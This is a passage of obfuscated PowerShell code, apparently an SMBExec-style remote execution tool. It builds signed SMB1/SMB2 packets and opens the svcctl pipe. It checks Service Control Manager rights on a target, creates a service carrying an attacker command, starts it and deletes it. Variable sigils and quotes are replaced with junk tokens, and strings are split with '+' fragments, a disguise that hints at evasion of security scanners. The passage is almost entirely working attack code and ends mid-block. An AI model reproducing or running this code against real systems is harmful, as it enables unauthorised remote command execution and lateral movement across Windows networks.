                        wB69RPC_data_length = wB69SMB_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data


                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ReadAndXRequestutH9

                        wB69stage_next = utH9CloseServiceHandleutH9

                        wB69SMB_close_service_handle_stage = 1

                    }


                    utH9LogoffutH9

                    {

                        wB69packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBLogoffAndXRequest

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data 

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDc'+'k] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ExitutH9

                    }


                    utH9OpenSCManagerWutH9

                    {

                        wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69packet_SCM_data = New-PacketSCMOpenSCManagerW wB69SMB_service_bytes wB69SMB_service_length

                        wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                        wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID (wB69RPC_data.Length + wB69SCM_data.Length)

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data 

                        wB69RPC_data_length = wB69SMB_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                        wB69packet'+'_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ReadAndXRequestutH9

                        wB69stage_next = utH9CheckAccessutH9           

                    }


                    utH9ReadAndXRequestutH9

                    {

                        Start-Sleep -m wB69Sleep

                        wB69packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SMB_'+'header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBReadAndXRequest wB69SMB_FID

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data 

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = wB69stage_next

                    }


                    utH9RPCBindutH9

                    {

                        wB69SMB_FID = wB69client_receive[42,43]

                        wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        wB69packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 wB69named_pipe_UUID 0x02,0x00

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                   '+'     wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID wB69RPC_data.Length

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69RPC_data_length = wB69SMB_data.Length + wB69RPC_data.Length

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                 '+'       wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        w'+'B69stage = utH9ReadAndXRequestutH9

                        wB69stage_next = utH9OpenSCManagerWutH9

                    }

                

                    utH9StartServiceWutH9

                    {

                    

                        if([System.BitConverter]::ToString(wB69client_receive[112..115]) -eq utH900-00-00-00utH9)

                        {

                            Write-Verbose NDckService wB69SMB_service created on wB69TargetNDck

                            wB69SMB_service_context_handle = wB69client_receive[92..111]

                            wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                                wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                                [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                                wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                            }


                            wB69packet_SCM_data = New-PacketSCMStartServiceW wB69SMB_service_context_handle

                            wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                            wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                            wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID (wB69RPC_data.Length + wB69SCM_data.Length)

                            wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                             

                            wB69RPC_data_length = wB69SMB_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                                wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                                wB69SMB_signature = wB69SMB_signature[0..7]

                                wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                                wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                            Write-Verbose NDck[*] Trying to execute command on wB69TargetNDck

'+'                            wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                            wB69client_stream.Flush()

                            wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                            wB69stage = utH9ReadAndXRequestutH9

                            wB69stage_next = utH9DeleteServiceWutH9  

                        }

                        elseif([System.BitConverter]::ToString(wB69client_receive[112..115]) -eq utH931-04-00-00utH9)

                        {

                            Write-Output NDck[-] Service wB69SMB_service creation failed on wB69TargetNDck

                            wB69stage = utH9ExitutH9

                        }

                        else

                        {

                            Write-Output NDck[-] Service creation fault context mismatchNDck

                          '+'  wB69stage = utH9ExitutH9

                        }

    

                    }

                

                    utH9TreeConnectAndXRequestutH9

                    {

                        wB69packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69MD5 = New-Object -TypeName Syste'+'m.Security.Cryptography.MD5CryptoServiceProvider

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBTreeConnectAndXRequest wB69SMB_path_bytes

           '+'             wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data 

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9CreateAndXRequestutH9

                    }


                    utH9TreeDisconnectutH9

                    {

                        wB69packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


              '+'          if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBTreeDisconnectRequest

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data 

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9LogoffutH9

                    }


                }

            

            }


        }  

        else

        {

            

            wB69stage = utH9TreeConnectutH9


            try

            {


                while (wB69stage -ne utH9ExitutH9)

                {


                    switch (wB69stage)

                    {

                

                        utH9CheckAccessutH9

                        {


                            if([System.BitConverter]::ToString(wB69client_receive[128..131]) -eq utH900-00-00-00utH9 -and [System.BitConverter]::ToString(wB69client_receive[108..127]) -ne utH900-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00utH9)

                            {


                                wB69SMB_service_manager_context_handle = wB69client_receive[108..127]

                                

                                if(wB69SMB_execute -eq wB69true)

                                {

                                    Write-Verbose NDckwB69output_username has Service Control Manager write privilege on wB69TargetNDck

                                    wB69packet_SCM_data = New-PacketSCMCreateServiceW wB69SMB_service_manager_context_handle wB69SMB_service_bytes wB69SMB_service_length wB69SMBExec_command_bytes wB69SMBExec_command_length_bytes

                                    wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data


                                    if(wB69SCM_data.Length -lt wB69SMB_split_index)

                                    {

                                        wB69stage = utH9CreateServiceWutH9

                                    }

                                    else

                                    {

                                        wB69stage = utH9CreateServiceW_FirstutH9

                                    }


                                }

                                else

                                {

                                    Write-Output NDck[+] wB69output_username has Service Control Manager write privilege on wB69TargetNDck

                                    wB69SMB_close_service_handle_stage = 2

                                    wB69stage = utH9CloseServiceHandleutH9

                                }


                            }

                            elseif([System.BitConverter]::ToString(wB69client_receive[128..131]) -eq utH905-00-00-00utH9)

                            {

                                Write-Output NDck[-] wB69output_username does not have Service Control Manager write privilege on wB69TargetNDck

                                wB69stage = utH9ExitutH9

                            }

                            else

                            {

                                Write-Output NDck[-] Some'+'thing went wrong with wB69TargetNDck

                                wB69stage = utH9ExitutH9

                            }


                        }


                        utH9CloseRequestutH9

                        {

                            wB69stage_current = wB69stage

                            wB69message_ID++

             '+'               wB69packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }

        

                            wB69packet_SMB2_data = New-PacketSMB2CloseRequest wB69file_ID

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                            wB69stage = utH9SendReceiveutH9

                        }


                        utH9CloseServiceHandleutH9

                        {


                            if(wB69SMB_close_service_handle_stage -eq 1)

                            {

                                Write-Verbose NDckService wB69SMB_service deleted on wB69TargetNDck

                                wB69packet_SCM_data = New-PacketSCMCloseServiceHandle wB69SMB_service_context_handle

                            }

                            else

                            {

                                wB69packet_SCM_data = New-PacketSCMCloseServiceHandle wB69SMB_service_manager_context_handle

                            }


                            wB69SMB_close_service_handle_stage++

                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                            wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data 

                            wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID (wB69RPC_data.Length + wB69SCM_data.Length)     

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                            wB69stage = utH9SendReceiveutH9

                        }

                    

                        utH9CreateRequestutH9

                        {

                            wB69stage_current = wB69stage

                            wB69SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # 9e0svcctl

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69packet_SMB2_data = New-PacketSMB2CreateRequestFile wB69SMB_named_pipe_bytes

                            wB69packet_SMB2_data[NDckShare_AccessNDck] = 0x07,0x00,0x00,0x00  

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data  

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data  

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data


                            try

                            {

                                wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                                wB69client_stream.Flush()

                                wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                                if(Get-StatusPending wB69client_receive[12..15])

                                {

                                    wB69stage = utH9StatusPendingutH9

                                }

                                else

                                {

                                    wB69stage = utH9StatusReceivedutH9

                                }


                            }

                            catch

                            {

                                Write-Output NDck[-] Session connection is closedNDck

                                wB69stage = utH9ExitutH9

                            }                    


                        }


                        utH9CreateServiceWutH9

                        {

                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID'+' wB69session_ID

                        

                            if(wB69SMB_signing)

   '+'                         {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                            wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID (wB69RPC_data.Length + wB69SCM_data.Length)

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

   '+'                         wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

'+'                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                            wB69stage = utH9SendReceiveutH9

                        }


                        utH9CreateServiceW_FirstutH9

                        {

                            wB69stage_current = wB69stage

                            wB69SMB_split_stage_final = [Math]::Ceiling(wB69SCM_data.Length / wB69SMB_split_index)

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                            

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69SCM_data_first = wB69SCM_data[0..(wB69SMB_split_index - 1)]

                            wB69packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 wB69SCM_data_first

                            wB69packet_RPC_data[NDckAllocHintNDck] = [System.BitConverter]::GetBytes(wB69SCM_data.Length)

                            wB69SMB_split_index_tracker = wB69SMB_split_index

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data 

                            wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID wB69RPC_data.Length

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data

                            wB69stage = utH9SendReceiveutH9

                        }


                        utH9CreateServiceW_MiddleutH9

                        {

                            wB69stage_current = wB69stage

                            wB69SMB_split_stage++

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                            

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69SCM_data_middle = wB69SCM_data[wB69SMB_split_index_tracker..(wB69SMB_split_index_tracker + wB69SMB_split_index - 1)]

                            wB69SMB_split_index_tracker += wB69SMB_split_index

                            wB69packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 wB69SCM_data_middle

                            wB69packet_RPC_data[NDckAllocHintNDck] = [System.BitConverter]::GetBytes(wB69SCM_data.Length - wB69SMB_split_index_tracker + wB69SMB_split_index)

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                            wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID wB69RPC_data.Length

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69p'+'acket_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69RPC'+'_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data

